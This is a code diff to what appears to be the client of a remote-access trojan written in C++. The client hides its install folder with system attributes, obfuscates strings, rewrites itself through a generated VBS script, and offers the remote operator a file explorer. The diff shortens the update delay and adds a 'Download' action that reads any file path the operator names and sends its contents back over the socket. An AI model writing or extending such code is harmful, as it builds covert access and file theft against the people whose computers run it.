@@ -135,7 +135,7 @@ bool UpdateClient(SOCKET Sock)
 	if (NewClient.j["System"])
 		su.NoOutputCMD((string)AY_OBFUSCATE("attrib +s \"") + MFP + "VXBkYXRl\\" + MF + "\"");
 
-	UpdateVBS += "WScript.Sleep 5000\n";
+	UpdateVBS += "WScript.Sleep 2500\n";
 	UpdateVBS += "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
 	UpdateVBS += "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n";
 	UpdateVBS += "filesys.DeleteFile \"" + FMFP + "\"\n";
@@ -314,7 +314,7 @@ void FileExplorer(SOCKET Sock)
 	du.SetCurrDir(du.GetModuleFilePath());
 	du.GetDir(du.GetCurrDir(), DirFiles);
 
-	j = DirFileTOjson(DirFiles);	
+	j = DirFileTOjson(DirFiles);
 
 	if (DEBUG)
 		cout << j.dump() << endl;
@@ -328,7 +328,7 @@ void FileExplorer(SOCKET Sock)
 
 		j.clear();
 		j = json::parse(Buff);
-		
+
 		if (j["Action"] == "Exit")
 			break;
 		else if (j["Action"] == "OpenDir")
@@ -464,6 +464,17 @@ void FileExplorer(SOCKET Sock)
 				}
 				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
 			}
+		}
+		else if (j["Action"] == "Download")
+		{
+			string FilePath = j["Path"];
+			string FileName = FilePath.substr(FilePath.find_last_of("\\") + 1);
+
+			if (!COMUNICAZIONI::UploadFileWithLoading(Sock, FileName, du.GetBinaryFileContent(FilePath)))
+				break;
+
+			if (!TcpIP::RecvString(Sock, Buff))
+				break;
 		}
 		else
 			break;
